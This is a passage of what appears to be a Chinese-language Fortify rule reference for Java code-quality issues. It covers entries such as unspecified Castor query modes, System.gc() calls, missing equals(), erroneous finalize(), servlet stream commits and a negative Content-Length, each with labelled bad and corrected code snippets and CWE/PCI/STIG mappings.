<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 7.1.2</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3500 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3500 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3500 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3500 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3500 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3500 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3500 CAT II</p>
<h4 id="Castor-Bad-Practices-Unspecified-Query-Mode"><a href="#Castor-Bad-Practices-Unspecified-Query-Mode" class="headerlink" title="Castor Bad Practices: Unspecified Query Mode"></a>Castor Bad Practices: Unspecified Query Mode</h4><h5 id="ABSTRACT-3"><a href="#ABSTRACT-3" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该 Castor 查询未明确定义查询模式。</p>
<h5 id="EXPLANATION-3"><a href="#EXPLANATION-3" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>默认情况下，Castor 以共享模式执行查询。由于共享模式允许读取访问和写入访问，因此该查询需要采取何种操作并不清楚。如果要在只读上下文中使用该对象，则共享访问会增加不必要的性能负担。</p>
<p>例 1：以下示例未指定查询模式。</p>
<p><code>results = query.execute();    //missing query mode</code></p>
<h5 id="RECOMMENDATIONS-3"><a href="#RECOMMENDATIONS-3" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为所有查询明确设置查询模式。该操作可以更清楚地显示查询的意图，而且还能够提高性能。</p>
<p>例 2：下例指定只读查询模式：</p>
<p><code>results = query.execute(Database.READONLY);</code></p>
<p>从设计的角度而言，采用只读查询模式可限制攻击者在程序人员不希望进行更新的位置更新对象的潜在风险。</p>
<h5 id="REFERENCES-3"><a href="#REFERENCES-3" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] ExoLab Group Castor JDO - Best practice</p>
<p>[2] ExoLab Group, Intalio Inc., and Contributors Database (Castor JavaDoc)</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 265</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 7.1.1</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 7.1.1</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 7.1.2</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 7.1.2</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 7.1.2</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3500 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3500 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3500 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3500 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3500 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3500 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3500 CAT II</p>
<h4 id="Code-Correctness-Call-to-System-gc"><a href="#Code-Correctness-Call-to-System-gc" class="headerlink" title="Code Correctness: Call to System.gc()"></a>Code Correctness: Call to System.gc()</h4><h5 id="ABSTRACT-4"><a href="#ABSTRACT-4" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>显式的调用垃圾回收机制可以预示系统性能可能出现的问题。</p>
<h5 id="EXPLANATION-4"><a href="#EXPLANATION-4" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>几乎所有的 Java 开发人员都会在工作中碰到这样的情况，有时候某个问题看上去非常神秘，让人难以理解，而且根本调试不出来，好像一点办法都没有，只能将原因归结为垃圾回收机制的问题。特别是当问题与 time and state 相关时，我们可以根据经验进行推断，并找到支持这一理论的根据：插入对 System.gc() 的调用似乎可以使问题迎刃而解。</p>
<p>在我们遇到的绝大多数情况中，调用 System.gc() 并非什么好方法。事实上，过于频繁地调用 System.gc() 会带来性能问题。</p>
<h5 id="RECOMMENDATIONS-4"><a href="#RECOMMENDATIONS-4" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>发现通过调用 System.gc() 似乎解决了问题时，找找看问题的解决是否源于其他原因，特别是涉及到了调用时间以及线程、进程、JVM 和操作系统间的交互问题。问题的症结可能是 I/O 缓存、同步和 race condition。</p>
<h5 id="REFERENCES-4"><a href="#REFERENCES-4" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] D. H. Hovermeyer FindBugs User Manual</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 730</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[4] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<p>[16] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[17] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="Code-Correctness-Class-Does-Not-Implement-equals"><a href="#Code-Correctness-Class-Does-Not-Implement-equals" class="headerlink" title="Code Correctness: Class Does Not Implement equals"></a>Code Correctness: Class Does Not Implement equals</h4><h5 id="ABSTRACT-5"><a href="#ABSTRACT-5" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在没有实现 equals() 的对象上调用了 equals() 方法。</p>
<h5 id="EXPLANATION-5"><a href="#EXPLANATION-5" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当比较对象时，开发人员通常希望比较对象的属性。然而，在没有明确实现 equals() 的类（或任何超类/接口）上调用 equals() 会导致调用继承自 java.lang.Object 的 equals() 方法。Object.equals() 将比较两个对象实例，查看它们是否相同，而不是比较对象成员字段或其他属性。尽管可以合法地使用 Object.equals()，但这通常表示存在错误代码。<br>例 1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">public class AccountGroup</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	private int gid;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">	public int getGid()</span><br><span class="line"></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		return gid;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">	public void setGid(int newGid)</span><br><span class="line"></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		gid = newGid;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">public class CompareGroup</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	public boolean compareGroups(AccountGroup group1, AccountGroup group2)</span><br><span class="line"></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		return group1.equals(group2);   //equals() is not implemented in AccountGroup</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-5"><a href="#RECOMMENDATIONS-5" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>验证 Object.equals() 的使用确实是您要调用的方法。如果不是，那么可实现 equals() 方法，或者使用其他方法来比较对象。</p>
<p>例 2：以下代码将 equals() 方法添加到“说明”部分中的示例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">public class AccountGroup</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	private int gid;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">	public int getGid()</span><br><span class="line"></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		return gid;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">	public void setGid(int newGid)</span><br><span class="line"></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		gid = newGid;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">	public boolean equals(Object o)</span><br><span class="line"></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		if (!(o instanceof AccountGroup))</span><br><span class="line"></span><br><span class="line">			return false;</span><br><span class="line"></span><br><span class="line">		AccountGroup other = (AccountGroup) o;</span><br><span class="line"></span><br><span class="line">		return (gid == other.getGid());</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">public class CompareGroup</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	public static boolean compareGroups(AccountGroup group1, AccountGroup group2)</span><br><span class="line"></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		return group1.equals(group2);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-5"><a href="#REFERENCES-5" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<h4 id="Code-Correctness-Erroneous-finalize-Method"><a href="#Code-Correctness-Erroneous-finalize-Method" class="headerlink" title="Code Correctness: Erroneous finalize() Method"></a>Code Correctness: Erroneous finalize() Method</h4><h5 id="ABSTRACT-6"><a href="#ABSTRACT-6" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>finalize() 方法应该调用 super.finalize()。</p>
<h5 id="EXPLANATION-6"><a href="#EXPLANATION-6" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>The Java Language Specification 中指出，finalize() 方法调用 super.finalize() 是一种非常好的做法 [1]。</p>
<p>例 1：以下方法没有调用 super.finalize()。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected void finalize() &#123;</span><br><span class="line"></span><br><span class="line">  discardNative();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-6"><a href="#RECOMMENDATIONS-6" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>每次实现 finalize 方法时，都应该调用 super.finalize()。</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">protected void finalize() &#123;</span><br><span class="line"></span><br><span class="line">  discardNative();</span><br><span class="line"></span><br><span class="line">  super.finalize();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-6"><a href="#REFERENCES-6" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] J. Gosling, B. Joy, G. Steele, G. Bracha The Java Language Specification, Second Edition Addison-Wesley</p>
<p>[2] MET12-J. Do not use finalizers CERT</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 568</p>
<h4 id="Code-Correctness-Incorrect-Serializable-Method-Signature"><a href="#Code-Correctness-Incorrect-Serializable-Method-Signature" class="headerlink" title="Code Correctness: Incorrect Serializable Method Signature"></a>Code Correctness: Incorrect Serializable Method Signature</h4><h5 id="ABSTRACT-7"><a href="#ABSTRACT-7" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在序列化方法上使用错误的方法签名可能导致永远不会调用该方法。</p>
<h5 id="EXPLANATION-7"><a href="#EXPLANATION-7" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>代码正确性：当可序列化的类创建序列化或反序列化函数但未采用正确的签名时，会发生“可序列化的方法签名不正确”的问题：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">private void writeObject(java.io.ObjectOutputStream out) throws IOException;</span><br><span class="line"></span><br><span class="line">private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException;</span><br><span class="line"></span><br><span class="line">private void readObjectNoData() throws ObjectStreamException;</span><br></pre></td></tr></table></figure>
<p>未使用序列化所要求的方法签名会导致在序列化/反序列化过程中永远不会调用该方法，这意味着将无法完成序列化/反序列化，或意味着不可信赖的代码可以获取对象的访问权限。 如果存在未抛出的异常，则可能意味着序列化/反序列化将失败并使应用程序崩溃，甚或可能悄然失败，以致构造的对象只是部分正确，从而导致出现极难调试的缺陷。调用程序应捕获这些异常，以便可以正确地处理错误的序列化/反序列化，而不会出现崩溃或部分构造的对象。</p>
<h5 id="RECOMMENDATIONS-7"><a href="#RECOMMENDATIONS-7" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在使用 Java 中需要特殊处理的类的序列化时，writeObject()、readObject() 和 readObjectNoData 方法必须具有正确的签名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">private void writeObject(java.io.ObjectOutputStream out) throws IOException;</span><br><span class="line"></span><br><span class="line">private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException;</span><br><span class="line"></span><br><span class="line">private void readObjectNoData() throws ObjectStreamException;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-7"><a href="#REFERENCES-7" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] SER01-J. Do not deviate from the proper signatures of serialization methods CERT</p>
<h4 id="Code-Correctness-Multiple-Stream-Commits"><a href="#Code-Correctness-Multiple-Stream-Commits" class="headerlink" title="Code Correctness: Multiple Stream Commits"></a>Code Correctness: Multiple Stream Commits</h4><h5 id="ABSTRACT-8"><a href="#ABSTRACT-8" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>提交 servlet 的输出流之后，重置流缓冲区或执行重新提交该数据流的其他任何操作都是错误的做法。与之类似，在调用 getOutputStream 之后调用 getWriter() 也是错误的做法，反之亦然。</p>
<h5 id="EXPLANATION-8"><a href="#EXPLANATION-8" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>转发 HttpServletRequest、重定向 HttpServletResponse 或者刷新 servlet 的输出流缓冲区会导致提交相关的数据流。后续执行的任何缓冲区重置或数据流提交操作，例如额外的刷新或重定向，将会导致出现 IllegalStateException。</p>
<p>此外，Java servlets 允许使用 ServletOutputStream 或 PrintWriter（但不能同时使用）将数据写入响应数据流。调用 getOutputStream() 之后调用 getWriter() 或者反向调用，也会导致出现 IllegalStateException。</p>
<p>在运行时，IllegalStateException 会阻止响应处理程序完成运行，轻易地使其中断响应。这会导致服务器不稳定，也间接表明 servlet 实现不正确。</p>
<p>例 1：以下代码会在 servlet 的输出流缓冲区刷新之后重定向其响应。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">public class RedirectServlet extends HttpServlet &#123;</span><br><span class="line"></span><br><span class="line">    public void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        OutputStream out = res.getOutputStream();</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        // flushes, and thereby commits, the output stream</span><br><span class="line"></span><br><span class="line">        out.flush();</span><br><span class="line"></span><br><span class="line">        out.close();        // redirecting the response causes an IllegalStateException</span><br><span class="line"></span><br><span class="line">        res.sendRedirect(&quot;http://www.acme.com&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例 2：相反，以下代码在请求转发之后会尝试写入并刷新 PrintWriter 的缓冲区。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">public class FlushServlet extends HttpServlet &#123;</span><br><span class="line"></span><br><span class="line">    public void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        // forwards the request, implicitly committing the stream</span><br><span class="line"></span><br><span class="line">        getServletConfig().getServletContext().getRequestDispatcher(&quot;/jsp/boom.jsp&quot;).forward(req, res);</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        // IllegalStateException; cannot redirect after forwarding</span><br><span class="line"></span><br><span class="line">        res.sendRedirect(&quot;http://www.acme.com/jsp/boomboom.jsp&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        PrintWriter out = res.getWriter();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        // writing to an already-committed stream will not cause an exception,</span><br><span class="line"></span><br><span class="line">        // but will not apply these changes to the final output, either</span><br><span class="line"></span><br><span class="line">        out.print(&quot;Writing here does nothing&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        // IllegalStateException; cannot flush a response&apos;s buffer after forwarding the request</span><br><span class="line"></span><br><span class="line">        out.flush();</span><br><span class="line"></span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-8"><a href="#RECOMMENDATIONS-8" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>确保提交数据流之后为未对其进行其他更改。对数据流执行其他写入操作最多只是操作无效，而执行其他提交操作 可能会导致 servlet 抛出 IllegalStateException。如果可能，最好遵守以下准则：</p>
<ol>
<li>执行 forward() 或 sendRedirect 之后立即返回。 </li>
<li>避免在调用 ServletResponse.getWriter() 或 ServletResponse.getOuputStream() 之后调用 forward() 或 sendRedirect()。</li>
</ol>
<h5 id="REFERENCES-8"><a href="#REFERENCES-8" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] IllegalStateException in a Servlet - when &amp; why do we get?</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[4] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[5] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<h4 id="Code-Correctness-Negative-Content-Length"><a href="#Code-Correctness-Negative-Content-Length" class="headerlink" title="Code Correctness: Negative Content-Length"></a>Code Correctness: Negative Content-Length</h4><h5 id="ABSTRACT-9"><a href="#ABSTRACT-9" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Content-Length 头文件设为负值。</p>
<h5 id="EXPLANATION-9"><a href="#EXPLANATION-9" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在大多数情况下，设置 Content-Length 请求标题表示开发者对 发送给服务器的 POST 数据长度感兴趣。但是，此标题应为 0 或 正整数。</p>
<p>示例 1：以下代码将设置不正确的 Content-Length。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">URL url = new URL(&quot;http://www.hp.com&quot;);</span><br><span class="line"></span><br><span class="line">HttpURLConnection huc = (HttpURLConnection)url.openConnection();</span><br><span class="line"></span><br><span class="line">huc.setRequestProperty(&quot;Content-Length&quot;, &quot;-1000&quot;);</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-9"><a href="#RECOMMENDATIONS-9" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请使用能正确计算和设置 Content-Length 头文件的库。</p>
<h5 id="REFERENCES-9"><a href="#REFERENCES-9" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<p>[2] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[3] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<h4 id="Code-Correctness-toString-on-Array"><a href="#Code-Correctness-toString-on-Array" class="headerlink" title="Code Correctness: toString on Array"></a>Code Correctness: toString on Array</h4><h5 id="ABSTRACT-10"><a href="#ABSTRACT-10" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>toString() 在数组上被调用。</p>
<h5 id="EXPLANATION-10"><a href="#EXPLANATION-10" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>大多数情况下，在数组上调用 toString() 表示开发者希望将数组内容作为字符串返回。然而，在数组上直接调用 toString() 将返回一个字符串值，它包含内存中该数组的类型和哈希码。 例 1：以下代码将输出 [Ljava.lang.String;@1232121。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String[] strList = new String[5];</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">System.out.println(strList);</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-10"><a href="#RECOMMENDATIONS-10" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在 Java 5 [1] 中引入了多种 Array.toString() 方法。这些方法将以逗号分隔的格式返回数组内容的字符串形式。 例 2：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String[] strList = new String[5];</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">System.out.println(Arrays.toString(strList));</span><br></pre></td></tr></table></figure>
<p>如果您使用的 Java 的版本较旧，那么可能需要迭代通过数组以获得每个元素的值。</p>
<h5 id="REFERENCES-10"><a href="#REFERENCES-10" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Class Arrays Sun Microsystems</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<h4 id="Dangerous-Field"><a href="#Dangerous-Field" class="headerlink" title="Dangerous Field"></a>Dangerous Field</h4><h5 id="ABSTRACT-11"><a href="#ABSTRACT-11" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该字段已标注为危险。所有对其的使用都将加注标记。</p>
<h5 id="EXPLANATION-11"><a href="#EXPLANATION-11" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>已将注释 FortifyDangerous 应用于此字段。这被用来表示该类型危险，并且所有对其的使用都应进行安全性检查。</p>
<h5 id="RECOMMENDATIONS-11"><a href="#RECOMMENDATIONS-11" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>检查其用法以确保其正确性与安全性。</p>
<h4 id="Dangerous-Method"><a href="#Dangerous-Method" class="headerlink" title="Dangerous Method"></a>Dangerous Method</h4><h5 id="ABSTRACT-12"><a href="#ABSTRACT-12" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该方法已标注为危险。所有对此方法的使用都会标记为问题。</p>
<h5 id="EXPLANATION-12"><a href="#EXPLANATION-12" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>已将注释 FortifyDangerous 应用于此方法。这被用来表示该类型危险，并且所有对其的使用都应进行安全性检查。</p>
<h5 id="RECOMMENDATIONS-12"><a href="#RECOMMENDATIONS-12" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>检查其用法以确保其正确性与安全性。</p>
<h5 id="REFERENCES-11"><a href="#REFERENCES-11" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
